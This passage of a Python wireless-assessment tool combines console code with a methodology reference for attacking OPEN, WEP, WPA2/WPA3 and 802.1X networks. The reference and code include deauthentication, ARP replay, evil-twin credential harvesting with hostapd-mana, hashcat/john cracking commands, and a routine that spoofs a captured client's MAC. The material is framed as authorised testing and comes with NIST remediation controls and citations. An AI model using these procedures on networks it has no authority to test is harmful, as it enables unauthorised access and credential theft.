        cfg_set("default_wordlist", value="")
        return



def _analysis_target_block(folder, info):
    """Draw TARGET + ARTIFACTS sections for analysis context.
    No-op if folder or info missing."""
    if not folder or not info:
        return
    print(rule("target"))
    print(row("essid",   info.get("essid", "-"), WHT))
    print(f"       {WHT}{'bssid':<12} "
          f"{info.get('bssid', '-'):<20}|  ch {info.get('channel', '-')}{R}")
    print(row("privacy", info.get("privacy", "-"), WHT))
    print(row("auth",    info.get("authentication", "-") or "-", WHT))
    print(row("flow",    _analysis_classify(info), WHT))
    print()

    artifacts = _analysis_find_artifacts(folder)
    print(rule("artifacts"))
    if artifacts:
        for label, path in artifacts:
            print(f"       {WHT}{label:<12}{os.path.basename(path)}{R}")
    else:
        print(f"       {WHT}(none){R}")
    print()


def menu_wordlist(show_run=False, method=None):
    while True:
        restore(); clear()
        standard_header()
        if show_run:
            folder, info = load_target()
            _analysis_target_block(folder, info)
        print(rule("wordlist strategies"))
        print(row("folder",   _wl_folder() or "(none)"))
        print(row("wordlist", CFG.get("default_wordlist") or "(none)"))
        print(row("mask",     CFG.get("default_mask") or "(none)"))
        if method:
            print(row("method", method))
        print()
        print(rule("options"))
        print(f"       {WHT}1  select wordlist{R}")
        print(f"       {WHT}2  define mask{R}")
        print(f"       {WHT}3  change folder{R}")
        if show_run:
            print(f"       {WHT}R  run recovery with current strategy{R}")
        print()
        sys.stdout.flush()
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return "back" if show_run else None
        if not choice or choice == "0":
            return "back" if show_run else None
        if show_run and choice.upper() == "R":
            return "run"
        if choice == "1":
            _wl_pick_wordlist(show_run=show_run)
        elif choice == "2":
            _wl_pick_mask(show_run=show_run)
        elif choice == "3":
            restore(); clear()
            print(); print()
            print(rule("change folder"))
            print(f"       {WHT}current: {_wl_folder()}{R}")
            print()
            try:
                new = input(f"   {LBL}new path \u25b8{R} ").strip()
            except (KeyboardInterrupt, EOFError):
                continue
            if new:
                new = os.path.abspath(os.path.expanduser(new))
                if os.path.isdir(new):
                    cfg_set("wordlists_dir", value=new)





# ── methodology reference ─────────────────────────────────────────────────

_PROTOCOLS = {
    "OPEN": {
        "name": "OPEN",
        "overview": (
            " A wireless network with no encryption and no authentication.\n"
            " All traffic is transmitted in cleartext and is observable by\n"
            " any passive listener on the same channel.\n\n"
            " KEY CONCEPTS:\n"
            "  - no encryption at link layer, cleartext traffic exposure\n"
            "  - no authentication for client identity verification\n"
            "  - susceptible to identity spoofing and unauthorized association\n"
            "  - PMF (802.11w) absent, management frames unprotected"
        ),
        "risk": " CRITICAL",
        "objective": (
            " Determine whether the target network permits unauthorized\n"
            " access due to absence of authentication and access control."
        ),
        "procedure": (
            " CAPTURE PHASE  - observe client associations, identify target MACs\n"
            " ANALYZE PHASE  - validate access control absence via identity test\n\n"
            " INTERFACE CONFIGURATION\n"
            " --------------------------------------------------------------------\n"
            " [T1] set monitor adapter to monitor mode\n\n"
            " CAPTURE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [T1] reconnaissance : airodump-ng --band abg <MON>\n"
            " [T1] target capture : airodump-ng -c <CH> --bssid <AP> -w capture <MON>\n\n"
            " ANALYZE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [A1] identity spoof : NM cloned-mac-address = <CLIENT_MAC>\n"
            " [A2] PMF status     : tshark -r capture-01.cap "
            "-Y \"wlan.rsn.capabilities.mfpc == 1\"\n"
            " [A3] deauth (opt.)  : aireplay-ng -0 5 -a <AP> -c <CLIENT> <MON>"
        ),
        "success_metrics": (
            " - a connected client present on the target network (MANDATORY)\n"
            " - assessor successfully spoofs a client MAC address\n"
            " - network access granted without credential challenge"
        ),
        "controls": [
            " [R1] SC-13 : implement WPA2/WPA3 encryption immediately",
            " [R2] AC-3  : if open access required, enforce TLS at application layer",
            " [R3] SC-7  : segment open network from internal resources",
            " [R4] AC-8  : captive portal with acceptable use policy",
            " [R5] SI-4  : deploy wireless intrusion detection system (WIDS)",
        ],
    },
    "WEP": {
        "name": "WEP",
        "overview": (
            " A legacy encryption standard introduced in 1997 and\n"
            " cryptographically broken since 2001. RC4 with a 24-bit IV space\n"
            " allows full key recovery through passive IV collection and\n"
            " statistical analysis, regardless of password length. No\n"
            " compensating control renders WEP safe.\n\n"
            " KEY CONCEPTS:\n"
            "  - RC4 stream cipher with 24-bit IV, IV space exhausted quickly\n"
            "  - IV reuse produces keystream collisions\n"
            "  - statistical key recovery feasible in minutes\n"
            "  - ARP replay accelerates IV generation\n"
            "  - fake authentication required before injection\n"
            "  - PMF not applicable, management frames unprotected"
        ),
        "risk": " CRITICAL - key recovery achievable within minutes",
        "objective": (
            " Evaluate susceptibility to cryptographic key recovery via IV\n"
            " accumulation and statistical analysis."
        ),
        "procedure": (
            " CAPTURE PHASE  - accumulate IVs via capture, fake auth, ARP replay\n"
            " ANALYZE PHASE  - key recovery via statistical attack\n\n"
            " INTERFACE CONFIGURATION\n"
            " --------------------------------------------------------------------\n"
            " [T1] set monitor adapter to monitor mode\n\n"
            " CAPTURE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [T1] reconnaissance : airodump-ng --band abg <MON>\n"
            " [T1] target capture : airodump-ng -c <CH> --bssid <AP> -w capture <MON>\n"
            " [T2] fake auth      : aireplay-ng --fakeauth 0 -a <AP> "
            "-h <ADAPTER_MAC> <MON>\n"
            " [T3] ARP replay     : aireplay-ng --arpreplay -b <AP> "
            "-h <ADAPTER_MAC> <MON>\n"
            " [T4] deauth (opt.)  : aireplay-ng -0 5 -a <AP> -c <CLIENT> <MON>\n\n"
            " ANALYZE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [A1] key recovery   : aircrack-ng -a 1 capture-01.cap\n"
            "      minimum IVs: 20000 | reliable: 50000 to 100000"
        ),
        "success_metrics": (
            " - a connected client present on the target network (MANDATORY)\n"
            " - IV accumulation confirmed, #Data counter rising\n"
            " - ARP replay accelerates IV generation\n"
            " - WEP key recovered"
        ),
        "controls": [
            " [R1] SC-13 / IA-7 : remove WEP immediately",
            " [R2] SC-12        : enforce WPA2-AES (CCMP) minimum, WPA3-SAE preferred",
            " [R3] IA-5         : eliminate shared static keys, deploy 802.1X",
            " [R4] SC-7         : isolate legacy WEP devices in dedicated VLAN",
            " [R5] SI-4         : detect abnormal ARP replay and deauth patterns",
            " [R6] CM-6         : enforce WEP prohibition in wireless baseline",
        ],
    },
    "WPA_PERSONAL": {
        "name": "WPA / WPA2 PERSONAL",
        "overview": (
            " The most widely deployed wireless security profile for home and\n"
            " office environments. Authentication relies on a single pre-shared\n"
            " key (PSK) negotiated through a 4-way handshake. The handshake can\n"
            " be captured passively without associating, and subjected to\n"
            " unlimited offline recovery attempts. Security is entirely\n"
            " dependent on passphrase entropy.\n\n"
            " KEY CONCEPTS:\n"
            "  - PSK authentication via 4-way handshake\n"
            "  - handshake capturable passively, no association required\n"
            "  - captured handshake enables unlimited offline attempts\n"
            "  - low-entropy passphrases are the primary exposure\n"
            "  - PMF (802.11w) blocks deauth-forced reassociation when Required\n"
            "  - WPA2-TKIP retains RC4 weaknesses, AES-CCMP is the baseline"
        ),
        "risk": (
            " HIGH - weak or dictionary-susceptible passphrase\n"
            " LOW  - high-entropy passphrase (>= 15 chars, non-dictionary)"
        ),
        "objective": (
            " Evaluate PSK resilience against handshake capture and offline\n"
            " recovery via dictionary and mask attempts."
        ),
        "procedure": (
            " CAPTURE PHASE  - capture 4-way handshake via evil twin\n"
            " ANALYZE PHASE  - offline passphrase recovery\n\n"
            " INTERFACE CONFIGURATION\n"
            " --------------------------------------------------------------------\n"
            " [T1] set monitor adapter to AP mode (evil twin)\n\n"
            " CAPTURE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [T1] evil twin     : hostapd-mana /tmp/wsa_evil_twin.conf\n"
            "      (WPA-PSK, cloned BSSID, channel per target)\n"
            "      watch for client association + handshake\n\n"
            " ANALYZE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [A1] hash extract  : mana_hashes.hc22000\n"
            " [A2] dictionary    : hashcat -m 22000 hashes.hc22000 <wordlist>\n"
            " [A3] mask          : hashcat -m 22000 hashes.hc22000 -a 3 <mask>\n"
            " [A4] view results  : hashcat -m 22000 hashes.hc22000 --show"
        ),
        "success_metrics": (
            " - a connected client present on the target network (MANDATORY)\n"
            " - client associated to rogue AP\n"
            " - 4-way handshake captured\n"
            " - passphrase recovered  ->  HIGH risk\n"
            " - passphrase not recovered  ->  LOW risk (entropy sufficient)"
        ),
        "controls": [
            " [R1] IA-5 / 800-63B : enforce passphrase >= 15 chars, non-dictionary",
            " [R2] SC-8           : enable PMF (802.11w), blocks deauth vector",
            " [R3] SC-13          : disable WPA2-TKIP, enforce AES-CCMP minimum",
            " [R4] IA-5(1)        : passphrase lifecycle and rotation policy",
            " [R5] SC-7           : separate guest and internal SSIDs",
            " [R6] SI-4           : detect deauth patterns and EAPOL sequences",
            " [R7] SC-13 / IA-7   : migrate to WPA3-SAE where device support allows",
        ],
    },
    "WPA3": {
        "name": "WPA3 PERSONAL",
        "overview": (
            " The current generation personal wireless standard, using SAE\n"
            " (Simultaneous Authentication of Equals), a zero-knowledge proof\n"
            " exchange that prevents passive credential capture. However, most\n"
            " deployed WPA3 networks operate in transition mode (WPA3/WPA2\n"
            " mixed), which reintroduces the WPA2 handshake exposure. A rogue\n"
            " AP offering WPA2 can trigger automatic client downgrade.\n\n"
            " KEY CONCEPTS:\n"
            "  - SAE: zero-knowledge authentication\n"
            "  - passphrases never transmitted, no passive credential material\n"
            "  - transition mode reintroduces WPA2 handshake exposure\n"
            "  - PMF Required on pure WPA3 blocks deauthentication frames\n"
            "  - primary exposure: transition mode and SSID impersonation"
        ),
        "risk": (
            " HIGH   - transition mode enabled (WPA2 downgrade viable)\n"
            " MEDIUM - transition mode with PMF Capable\n"
            " LOW    - pure WPA3-SAE, PMF Required, validated clients"
        ),
        "objective": (
            " Assess resilience against transition-mode downgrade via rogue\n"
            " AP deployment and SSID impersonation."
        ),
        "procedure": (
            " CAPTURE PHASE  - deploy evil twin, capture downgraded handshake\n"
            " ANALYZE PHASE  - offline recovery against captured handshake\n\n"
            " INTERFACE CONFIGURATION\n"
            " --------------------------------------------------------------------\n"
            " [T1] set monitor adapter to AP mode (evil twin)\n\n"
            " CAPTURE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [T1] evil twin     : hostapd-mana /tmp/wsa_evil_twin.conf\n"
            "      (WPA-PSK downgrade, cloned BSSID, channel per target)\n"
            "      transition-mode clients auto-associate to rogue WPA2 AP\n"
            "      pure WPA3 clients require user action\n\n"
            " ANALYZE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [A1] hash extract  : mana_hashes.hc22000\n"
            " [A2] dictionary    : hashcat -m 22000 hashes.hc22000 <wordlist>\n"
            " [A3] mask          : hashcat -m 22000 hashes.hc22000 -a 3 <mask>\n"
            " [A4] view results  : hashcat -m 22000 hashes.hc22000 --show"
        ),
        "success_metrics": (
            " - a connected client present on the target network (MANDATORY)\n"
            " - client associated to rogue AP (transition) or manually (pure)\n"
            " - 4-way handshake captured from rogue AP\n"
            " - passphrase recovered  ->  HIGH risk\n"
            " - passphrase not recovered  ->  LOW risk"
        ),
        "controls": [
            " [R1] SC-13 : disable WPA2 transition mode, enforce pure WPA3-SAE",
            " [R2] SC-8  : PMF Required, blocks deauth-based reassociation",
            " [R3] IA-5  : lock client profiles to SSID and security type",
            " [R4] SI-4  : WIDS alerts on duplicate or near-duplicate SSIDs",
            " [R5] CM-6  : enforce WPA3-only baseline",
        ],
    },
    "ENTERPRISE": {
        "name": "ENTERPRISE  (802.1X / EAP)",
        "overview": (
            " The standard wireless security profile for corporate, academic,\n"
            " and government environments. Each user authenticates individually\n"
            " via EAP against a RADIUS server. Security depends on EAP method\n"
            " selection and certificate validation enforcement.\n\n"
            " KEY CONCEPTS:\n"
            "  - 802.1X port-based access control via RADIUS\n"
            "  - EAP negotiates the authentication method in-band\n"
            "  - EAP method strength varies, PEAP/MSCHAPv2 is hash-recoverable\n"
            "  - EAP-TLS requires mutual certificate authentication, strongest\n"
            "  - rogue AP intercepts EAP if client lacks certificate validation\n"
            "  - MSCHAPv2 challenge/response captured via mana_wpe"
        ),
        "risk": (
            " HIGH   - weak EAP method and no certificate validation\n"
            " MEDIUM - strong EAP method, partial certificate validation\n"
            " LOW    - EAP-TLS mutual auth, strict validation, PMF Required"
        ),
        "objective": (
            " Assess EAP authentication robustness against rogue AP credential\n"
            " harvesting, EAP method downgrade, and certificate validation bypass."
        ),
        "procedure": (
            " CAPTURE PHASE  - deploy evil twin EAP, harvest auth material\n"
            " ANALYZE PHASE  - offline credential recovery\n\n"
            " INTERFACE CONFIGURATION\n"
            " --------------------------------------------------------------------\n"
            " [T1] set monitor adapter to AP mode (evil twin)\n\n"
            " CAPTURE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [T1] evil twin     : hostapd-mana /tmp/wsa_evil_twin.conf\n"
            "      (WPA-EAP, cloned BSSID, mana_wpe=1)\n"
            "      EAP identity + MSCHAPv2 exchange visible on client connect\n\n"
            " ANALYZE PROCEDURE\n"
            " --------------------------------------------------------------------\n"
            " [A1] extract       : credentials.txt -> hashes_jtr.txt, hashes_hc5500.txt\n"
            " [A2] hashcat       : hashcat -m 5500 hashes_hc5500.txt <wordlist>\n"
            " [A3] john          : john --format=netntlm --wordlist=<wordlist> hashes_jtr.txt\n"
            " [A4] view results  : hashcat -m 5500 hashes_hc5500.txt --show"
        ),
        "success_metrics": (
            " - a connected client present on the target network (MANDATORY)\n"
            " - EAP material captured from rogue AP\n"
            " - credential recovered  ->  HIGH risk\n"
            " - rogue certificate rejected by client  ->  LOW risk"
        ),
        "controls": [
            " [R1] IA-8 / SC-12 : enforce EAP-TLS with mutual certificate auth",
            " [R2] SC-17        : strict server certificate validation on clients",
            " [R3] IA-5         : disable MSCHAPv2 and TTLS-PAP",
            " [R4] SC-7         : per-VLAN assignment via RADIUS",
            " [R5] SI-4 / AU-3  : RADIUS accounting, alert on EAP failures",
            " [R6] CM-6         : enforce PKI for wireless authentication",
        ],
    },
}

_METHODOLOGY_MENU = {
    "1": "OPEN", "2": "WEP", "3": "WPA_PERSONAL",
    "4": "WPA_PERSONAL", "5": "WPA3",
    "6": "ENTERPRISE", "7": "ENTERPRISE", "8": "ENTERPRISE",
}

_REFERENCES = {
    "OPEN": [
        "IEEE 802.11-2020. Wireless LAN MAC and PHY Specifications.",
        "NIST SP 800-153. Guidelines for Securing Wireless Local Area Networks (WLANs). 2012.",
        "RFC 8908. Captive Portal API. IETF, 2020.",
        "OWASP. Wireless Security Testing Guide, v1.0. 2021.",
        "Wi-Fi Alliance. WPA3 Specification, v3.0. 2019.",
    ],
    "WEP": [
        "Borisov, N., Goldberg, I., Wagner, D. Intercepting Mobile Communications: The Insecurity of 802.11. MobiCom 2001.",
        "Fluhrer, S., Mantin, I., Shamir, A. Weaknesses in the Key Scheduling Algorithm of RC4. SAC 2001.",
        "Stubblefield, A., Ioannidis, J., Rubin, A. A Key Recovery Attack on the 802.11b WEP Protocol. ACM TISSEC, 2004.",
        "Tews, E., Weinmann, R.P., Pyshkin, A. Breaking 104-bit WEP in Less Than 60 Seconds. WISTP 2007.",
        "IEEE 802.11-2020. Wireless LAN MAC and PHY Specifications.",
        "NIST SP 800-153. Guidelines for Securing WLANs. 2012.",
    ],
    "WPA_PERSONAL": [
        "Moskowitz, R. Weakness in Passphrase Choice in WPA Interface. 2003.",
        "Vanhoef, M., Piessens, F. Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2. ACM CCS 2017.",
        "Vanhoef, M., Piessens, F. Release the Kraken: New KRACKs in the 802.11 Standard. ACM CCS 2018.",
        "IEEE 802.11-2020. Wireless LAN MAC and PHY Specifications.",
        "NIST SP 800-63B. Digital Identity Guidelines — Authentication and Lifecycle Management. 2017.",
        "NIST SP 800-153. Guidelines for Securing WLANs. 2012.",
        "SensePost. hostapd-mana. github.com/sensepost/hostapd-mana",
    ],
    "WPA3": [
        "Vanhoef, M., Ronen, E. Dragonblood: A Security Analysis of WPA3's SAE Handshake. IEEE S&P 2020.",
        "Harkins, D. Simultaneous Authentication of Equals: A Secure, Password-Based Key Exchange for Mesh Networks. IEEE 2008.",
        "Wi-Fi Alliance. WPA3 Specification, v3.0. 2019.",
        "IEEE 802.11-2020. Wireless LAN MAC and PHY Specifications.",
        "NIST SP 800-153. Guidelines for Securing WLANs. 2012.",
        "SensePost. hostapd-mana. github.com/sensepost/hostapd-mana",
    ],
    "ENTERPRISE": [
        "Aboba, B., Blunk, L., Vollbrecht, J., Carlson, J., Levkowetz, H. RFC 3748 — Extensible Authentication Protocol (EAP). IETF 2004.",
        "Simon, D., Aboba, B., Hurst, R. RFC 5216 — The EAP-TLS Authentication Protocol. IETF 2008.",
        "Funk, P., Blake-Wilson, S. RFC 5281 — EAP-TTLS. IETF 2008.",
        "Asokan, N., Niemi, V., Nyberg, K. Man-in-the-Middle in Tunneled Authentication Protocols. IACR ePrint 2002/034.",
        "Rigney, C., Willens, S., Rubens, A., Simpson, W. RFC 2865 — RADIUS. IETF 2000.",
        "NIST SP 800-153. Guidelines for Securing WLANs. 2012.",
        "SensePost. hostapd-mana. github.com/sensepost/hostapd-mana",
    ],
}


def _methodology_draw_menu():
    restore(); clear()
    standard_header()
    print()
    print(rule("orientation"))
    print()
    print(f"       {WHT}A WIRELESS NETWORK IS A DOORWAY{R}")
    print()

    # statement / description / tag
    doors = [
        ("some are open",              "nothing asked, nothing returned.",      "OPEN / OWE"),
        ("some are open at the radio", "the ask arrives later, on a web page.", "captive portal"),
        ("some ask for a key",         "the lock was broken decades ago.",      "WEP"),
        ("some ask for a passphrase",  "one shared secret, negotiated.",        "WPA / WPA2 / WPA3 personal"),
        ("some ask for a name",        "a username, a password, per person.",   "WPA2 / WPA3 enterprise"),
        ("some ask for proof",         "a certificate, one side or both.",      "EAP-TLS"),
    ]

    # target column = longest "left" + 2 spaces
    longest = max(len(f"{s} \u2014 {d}") for s, d, _ in doors)
    col     = longest + 2

    for stmt, desc, tag in doors:
        left = f"{stmt} \u2014 {desc}"
        pad  = col - len(left)
        print(f"       {WHT}{left}{R}{' ' * pad}{LBL}[{tag}]{R}")
    print()
    print(f"       {WHT}knowing which door you are facing tells you "
          f"which procedure to run,{R}")
    print(f"       {WHT}what to capture, what to expect at each step, "
          f"and how to defend against it.{R}")
    print()
    print(rule("options"))
    print(f"       {WHT}1  OPEN                NONE   NONE     NONE{R}")
    print(f"       {WHT}2  WEP                 WEP    RC4      OPN / SKA{R}")
    print(f"       {WHT}3  WPA-PERSONAL        WPA    TKIP     PSK{R}")
    print(f"       {WHT}4  WPA2-PERSONAL       WPA2   CCMP     PSK{R}")
    print(f"       {WHT}5  WPA3-PERSONAL       WPA3   GCMP     SAE{R}")
    print(f"       {WHT}6  WPA-ENTERPRISE      WPA    TKIP     EAP (TTLS/PEAP){R}")
    print(f"       {WHT}7  WPA2-ENTERPRISE     WPA2   CCMP     EAP (PEAP/MSCHAPv2){R}")
    print(f"       {WHT}8  WPA3-ENTERPRISE     WPA3   GCMP     EAP-TLS{R}")
    print()
    sys.stdout.flush()

def _methodology_draw_protocol(key):
    """Render full protocol reference into a temp file, view with less -R."""
    p = _PROTOCOLS[key]
    lines = []
    a = lambda s: lines.append(s)

    a("")
    a(f"       {WHT}{p['name']}  —  assessment reference{R}")
    a("")

    _WRAP_W = 88   # content width — 7-space prepend + 88 = 95 = diagram interior
    for title, body in (("overview",            p["overview"]),
                        ("risk classification",  p["risk"]),
                        ("assessment objective", p["objective"]),
                        ("assessment criteria",  p["success_metrics"])):
        a(rule(title))
        for line in body.splitlines():
            if len(line) <= _WRAP_W:
                a(f"       {WHT}{line}{R}")
                continue
            _lead = len(line) - len(line.lstrip())
            for _wl in textwrap.wrap(
                    line.lstrip(),
                    width=_WRAP_W - _lead,
                    initial_indent=" " * _lead,
                    subsequent_indent=" " * _lead,
                    break_long_words=False,
                    break_on_hyphens=False):
                a(f"       {WHT}{_wl}{R}")
        a("")

    a(rule("remediation controls  (nist sp 800-53)"))
    for ctrl in p["controls"]:
        a(f"       {WHT}{ctrl}{R}")

    # NIST family legend — extract families actually used in the controls
    _fams = set()
    for _ctrl in p["controls"]:
        for _m in re.finditer(r'\b([A-Z]{2})-\d+', _ctrl):
            _fams.add(_m.group(1))
    _fam_names = {
        "AC": "Access Control",
        "AU": "Audit and Accountability",
        "CA": "Assessment, Authorization, and Monitoring",
        "CM": "Configuration Management",
        "IA": "Identification and Authentication",
        "RA": "Risk Assessment",
        "SC": "System and Communications Protection",
        "SI": "System and Information Integrity",
        "SR": "Supply Chain Risk Management",
    }
    if _fams:
        a("")
        a(f"       {DIM}NIST CONTROL FAMILIES USED ABOVE{R}")
        for _f in sorted(_fams):
            a(f"         {DIM}{_f} — {_fam_names.get(_f, '')}{R}")
    a("")

    # references — solid citations backing every claim above
    _refs = _REFERENCES.get(key, [])
    if _refs:
        a(rule("references"))
        _REF_W = 84   # 7-space prepend + 84 = 91 = fits inside pane
        for _i, _r in enumerate(_refs, 1):
            _lead = f"[{_i}] "
            _prefix = " " * (7 + len(_lead))
            if len(_lead) + len(_r) <= _REF_W:
                a(f"       {WHT}{_lead}{_r}{R}")
            else:
                for _wl in textwrap.wrap(
                        _r,
                        width=_REF_W - len(_lead),
                        subsequent_indent=_prefix[7:],
                        break_long_words=False,
                        break_on_hyphens=False):
                    if _wl is not None and _wl.startswith(" "):
                        a(f"       {WHT}{_lead}{_wl.lstrip()}{R}")
                        _lead = " " * len(_lead)
                    else:
                        a(f"       {WHT}{_wl}{R}")
        a("")

    # step-by-step procedure with commands and drawings
    proc_key = _METHOD_KEY_MAP.get(key, key)
    steps = _PROCEDURE_STEPS.get(proc_key)
    if steps:
        title = _PROCEDURE_TITLES.get(proc_key, f"procedure {proc_key}")
        a(rule(title))
        for label, name, panel, body, cmds in steps:
            a(f"       {WHT}[{label}] {name.upper()}{R}")
            for b in body:
                a(f"                {WHT}{b}{R}")
            if cmds:
                a("")
                for c in cmds:
                    a(f"                {DIM}$ {c}{R}")
            art = _PROCEDURE_DRAWINGS.get((proc_key, label))
            if art:
                a("")
                for line in art.strip("\n").split("\n"):
                    a(f"       {WHT}{line}{R}")
            a("")

    fd, tmp = tempfile.mkstemp(prefix="wsa_methodology_", suffix=".txt")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    restore()
    clear()  # ensure cursor at home — less paints from row 1
    try:
        subprocess.run(["less", "-R", "-X", tmp])
    except KeyboardInterrupt:
        pass
    try:
        os.unlink(tmp)
    except OSError:
        pass
    clear()

def run_methodology():
    set_pane_title("METHODOLOGY")
    while True:
        _methodology_draw_menu()
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if not choice or choice == "0":
            return
        if choice in _METHODOLOGY_MENU:
            _methodology_draw_protocol(_METHODOLOGY_MENU[choice])
            # less exited via q — loop redraws menu directly

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 7 · WORKER CONSOLES
# ═══════════════════════════════════════════════════════════════════════════

def _capture_draw_menu():
    restore(); clear()
    set_pane_title("CAPTURE CONSOLE")
    _console_banner("CAPTURE")
    print()
    print(rule("options"))
    print(f"       {WHT}1  start capture  ·  ctrl+c to stop and return{R}")
    print()
    sys.stdout.flush()

def run_capture_console():
    set_pane_title("CAPTURE CONSOLE")
    while True:
        folder, info = load_target()
        if not folder:
            clear()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            time.sleep(2)
            continue

        _capture_draw_menu()
        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue
        if choice != "1":
            continue

        bssid = info.get("bssid", "")
        ch    = info.get("channel", "1")
        restore(); clear()
        print(); print()
        print(f"       {WHT}starting airodump on channel {ch} · Ctrl+C to stop{R}")
        print()
        sys.stdout.flush()
        try:
            subprocess.run(["sudo", "airodump-ng",
                            "--bssid", bssid,
                            "-c", ch,
                            "--output-format", "pcap,csv",
                            "-w", f"{folder}/capture",
                            MONITOR()])
        except KeyboardInterrupt:
            pass
        time.sleep(0.3)

def _mac_draw_main():
    restore(); clear()
    _console_banner("MAC")
    iface = SPOOF()
    c = current_mac(iface) or "(not found)"
    print(rule("adapter"))
    print(f"       {WHT}{iface:<12}{c}{R}")
    print()
    print(rule("options"))
    print(f"       {WHT}1  reset mac{R}")
    print(f"       {WHT}2  spoof adapter mac{R}")
    print()
    sys.stdout.flush()

def _mac_draw_spoof_menu(folder, bssid):
    restore(); clear()
    _console_banner("MAC")
    iface = SPOOF()
    print(rule("spoof"))
    print(f"       {WHT}{'adapter':<12}{iface}{R}")
    print(f"       {WHT}{'current':<12}{current_mac(iface) or '(not found)'}{R}")
    print()

    stations = load_stations(folder, bssid)
    if not stations:
        print(f"       {WHT}wait for a station ...{R}")
        print()
        sys.stdout.flush()
        input(" press ENTER to return ")
        return None

    print(rule("targets"))
    for i, mac in enumerate(stations, 1):
        print(f"       {WHT}{i}  {mac}{R}")
    print()
    sys.stdout.flush()

    try:
        choice = input(f"   {LBL}SELECT OPTION \u25b8{R} ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    if not choice.isdigit():
        return None
    n = int(choice)
    if 1 <= n <= len(stations):
        return stations[n - 1]
    return None

def _mac_do_spoof(folder, mac):
    restore(); clear()
    iface = SPOOF()
    print(); print()
    print(rule("spoof"))
    print(row("adapter", iface, WHT))
    print(row("target",  mac,   WHT))
    print(f"       {WHT}saving station ...{R}")
    save_station(folder, mac)

    print(f"       {WHT}writing NM drop-in ...{R}")
    write_nm_dropin(mac)

    print(f"       {WHT}restarting NetworkManager ...{R}")
    _run_sudo("systemctl", "restart", "NetworkManager")
    time.sleep(4)
    _run_sudo("nmcli", "dev", "set", iface, "managed", "yes")
    time.sleep(2)

    print(f"       {WHT}applying mac directly ...{R}")
    _run_sudo("ip", "link", "set", iface, "down")
    _run_sudo("ip", "link", "set", iface, "address", mac)
    _run_sudo("ip", "link", "set", iface, "up")

    applied  = False
    stable   = 0
    deadline = time.time() + 15
    while time.time() < deadline:
        if current_mac(iface) == mac.upper():
            stable += 1
            if stable >= 4:
                applied = True
                break
        else:
            stable = 0
        time.sleep(0.5)

    if not applied:
        print(f"       {WHT}re-applying mac ...{R}")
        _run_sudo("ip", "link", "set", iface, "down")
        _run_sudo("ip", "link", "set", iface, "address", mac)
        _run_sudo("ip", "link", "set", iface, "up")
        time.sleep(3)
        applied = current_mac(iface) == mac.upper()

    print()
    if applied:
        print(f"  {RDY}DONE{R}  {WHT}MAC spoof applied{R}")
    else:
        print(f"  {VAL}WARN{R}  {WHT}MAC change not confirmed{R}")
    print(row("original", original_mac(iface) or "(unknown)", WHT))
    print(row("current",  current_mac(iface)  or "(not found)", WHT))
    print()
    input(" press ENTER to return ")

def _mac_do_reset():
    restore(); clear()
    iface = SPOOF()
    print(); print()
    print(rule("reset"))
    print()

    print(f"       {WHT}restoring hardware MAC ...{R}")
    write_nm_dropin("permanent")

    hw = original_mac(iface)
    if hw:
        _run_sudo("ip", "link", "set", iface, "down")
        _run_sudo("ip", "link", "set", iface, "address", hw)
        _run_sudo("ip", "link", "set", iface, "up")

    _run_sudo("systemctl", "restart", "NetworkManager")
    _run_sudo("nmcli", "dev", "set", iface, "managed", "yes")
    time.sleep(3)

    print()
    print(f"  {RDY}DONE{R}  {WHT}{iface} reset{R}")
    print(row("original", original_mac(iface) or "(unknown)", WHT))
    print(row("current",  current_mac(iface)  or "(not found)", WHT))
    print()
    input(" press ENTER to return ")

def run_mac_console():
    set_pane_title("MAC CONSOLE")
    role_signals(ignore_sigint=True)

    while True:
        folder, info = load_target()
        if not folder:
            clear()
            print()
            print(f"  {ERR}ERROR:{R} no target selected")
            print()
            input(" press ENTER ")
            continue

        bssid = info.get("bssid", "")
        _mac_draw_main()

        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if choice == "1":
            _mac_do_reset()
            continue
        if choice == "2":
            pick = _mac_draw_spoof_menu(folder, bssid)
            if pick:
                _mac_do_spoof(folder, pick)
            continue

def _ping_draw_menu():
    restore(); clear()
    _console_banner("PING")
    iface = SPOOF()
    print(rule("adapter"))
    print(f"       {WHT}{iface:<12}{current_mac(iface) or '(not found)'}{R}")
    print()
    print(rule("options"))
    print(f"       {WHT}1  connectivity test  (ip · gw · icmp · http){R}")
    print(f"       {WHT}2  continuous ping 8.8.8.8  (ctrl+c to stop){R}")
    print()
    sys.stdout.flush()

def run_ping_console():
    set_pane_title("PING CONSOLE")

    while True:
        _ping_draw_menu()
        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            continue

        if choice not in ("1", "2"):
            continue

        iface = SPOOF()
        if not is_spoofed(iface):
            restore(); clear()
            print(); print()
            print(f"       {WHT}adapter not spoofed{R}")
            print(f"       {WHT}use MAC CONSOLE to spoof first{R}")
            print()
            input(" press ENTER to return ")
            continue

        folder, info = load_target()
        essid = (info.get("essid") or "").strip() if info else ""
        if essid:
            restore(); clear()
            print(); print()
            print(f"       {WHT}connecting {iface} to {essid} ...{R}")
            print()
            sys.stdout.flush()
            if not _connect_to_essid(iface, essid):
                print(f"       {VAL}not associated to {essid}{R}")
                print(f"       {DIM}if AP still holds a session for the spoofed MAC,{R}")
                print(f"       {DIM}deauth the target first (DEAUTH console -> 2){R}")
                print()

